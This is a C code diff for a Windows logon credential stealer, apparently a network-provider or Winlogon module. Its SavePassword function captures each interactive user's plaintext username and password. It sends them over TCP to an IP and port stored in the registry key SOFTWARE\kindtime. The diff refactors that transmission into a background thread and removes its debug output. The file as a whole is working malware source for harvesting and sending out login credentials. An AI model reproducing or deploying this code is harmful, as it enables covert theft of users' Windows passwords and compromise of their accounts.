@@ -1,127 +1,32 @@
-#include <winsock2.h>
-#include <stdio.h>
-#include <Windows.h>
+#include "winlogon.h"
 
-#pragma comment(lib,"ws2_32.lib") //Winsock Library
-
-#define rKey L"SOFTWARE\\kindtime"
-
-// from npapi.h
-#define WNNC_SPEC_VERSION                0x00000001
-#define WNNC_SPEC_VERSION51              0x00050001
-#define WNNC_NET_TYPE                    0x00000002
-#define WNNC_START                       0x0000000C
-#define WNNC_WAIT_FOR_START              0x00000001
-
-//from ntdef.h
-typedef struct _UNICODE_STRING
+void sendCreds(char* creds)
 {
-	USHORT Length;
-	USHORT MaximumLength;
-	PWSTR Buffer;
-} UNICODE_STRING, * PUNICODE_STRING;
+	char* ip = getIPReg(L"ipa");
+	DWORD port = getPtReg();
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return 1; } 
 
-// from NTSecAPI.h
-typedef enum _MSV1_0_LOGON_SUBMIT_TYPE
-{
-	MsV1_0InteractiveLogon = 2,
-	MsV1_0Lm20Logon,
-	MsV1_0NetworkLogon,
-	MsV1_0SubAuthLogon,
-	MsV1_0WorkstationUnlockLogon = 7,
-	MsV1_0S4ULogon = 12,
-	MsV1_0VirtualLogon = 82,
-	MsV1_0NoElevationLogon = 83,
-	MsV1_0LuidLogon = 84,
-} MSV1_0_LOGON_SUBMIT_TYPE, * PMSV1_0_LOGON_SUBMIT_TYPE;
+	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) { goto error; }
 
-// from NTSecAPI.h
-typedef struct _MSV1_0_INTERACTIVE_LOGON
-{
-	MSV1_0_LOGON_SUBMIT_TYPE MessageType;
-	UNICODE_STRING LogonDomainName;
-	UNICODE_STRING UserName;
-	UNICODE_STRING Password;
-} MSV1_0_INTERACTIVE_LOGON, * PMSV1_0_INTERACTIVE_LOGON;
+	server.sin_addr.s_addr = inet_addr(ip);
+	server.sin_family = AF_INET;
+	server.sin_port = htons(port);
 
+	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) { goto error; }
 
-DWORD getPtReg()
-{
-	HKEY hkey;
-	DWORD dw;
-	DWORD Type;
-	DWORD Datasize = 255;
-	DWORD port;
+	if (send(s, creds, strlen(creds), 0) < 0) { goto error; }
 
-	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
-		rKey,
-		0,
-		KEY_QUERY_VALUE | KEY_WOW64_32KEY,
-		&hkey) == ERROR_SUCCESS)
+	free(creds);
+	free(ip);
+	WSACleanup();
+	return 0;
 
-	{
-		DWORD error = RegQueryValueEx(hkey,
-			L"pt",
-			NULL,
-			&Type,
-			(LPBYTE)&port,
-			&Datasize);
-
-		if (error == ERROR_SUCCESS)
-		{
-			RegCloseKey(hkey);
-			return port;
-		}
-		RegCloseKey(hkey);
-	}
-	return 80;
+error:
+	free(creds);
+	free(ip);
+	WSACleanup();
+	return 1;
 }
-
-char* getIPReg(const short* input)
-{
-	HKEY hKey;
-	char Data[255];
-	DWORD Datasize = sizeof(Data);
-	DWORD Type;
-	char* ipa = (char*)malloc(20);
-	int indCtr = 0;
-
-	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
-		rKey,
-		0,
-		KEY_QUERY_VALUE | KEY_WOW64_32KEY,
-		&hKey) == ERROR_SUCCESS)
-	{
-		DWORD error = RegQueryValueEx(hKey,
-			input,
-			NULL,
-			&Type,
-			(LPBYTE)&Data,
-			&Datasize);
-
-		if (error == ERROR_SUCCESS)
-		{
-			for (int i = 0; i < sizeof(Data); i += 2)
-			{
-				if (Data[i] == '\0')
-				{
-					ipa[indCtr] = '\0';
-					break;
-				}
-				else
-				{
-					ipa[indCtr] = Data[i];
-					indCtr++;
-				}
-			}
-			RegCloseKey(hKey);
-			return ipa;
-		}
-		RegCloseKey(hKey);
-	}
-	return "8.8.8.8";
-}
-
 
 int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 {
@@ -129,65 +34,13 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	SOCKET s;
 	struct sockaddr_in server;
 
-	char user[50];
-	char pass[50];
-	char creds[150];
-
-	wcstombs(user, username->Buffer, sizeof(user));
-	wcstombs(pass, password->Buffer, sizeof(pass));
-
-	char* ip = getIPReg(L"ipa");
-	DWORD port = getPtReg();
-	printf("\nInitialising Winsock...");
-	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
-	{
-		printf("Failed. Error Code : %d", WSAGetLastError());
-		return 1;
-	}
-
-	printf("Initialised.\n");
-
-	//Create a socket
-	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
-	{
-		printf("Could not create socket : %d", WSAGetLastError());
-		goto error;
-	}
-
-	printf("Socket created.\n");
-
-	server.sin_addr.s_addr = inet_addr(ip);
-	server.sin_family = AF_INET;
-	server.sin_port = htons(port);
-
-	//Connect to remote server
-	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
-	{
-		puts("connect error");
-		goto error;
-	}
-
-	puts("Connected");
+	char* creds = (char*)malloc(150);
 
 	char* eip = getIPReg(L"eip");
-	sprintf(creds, "%s:%s;end;%s;", user, pass, eip);
+	sprintf(creds, "%ws:%ws;end;%s;", username->Buffer, password->Buffer, eip);
 	free(eip);
-	//Send some data
-	if (send(s, creds, strlen(creds), 0) < 0)
-	{
-		puts("Send failed");
-		goto error;
-	}
-	puts("Data Send\n");
 
-	free(ip);
-	WSACleanup();
-	return 0;
-
-error:
-	free(ip);
-	WSACleanup();
-	return 1;
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendCreds, creds, 0, NULL);
 }
 
 
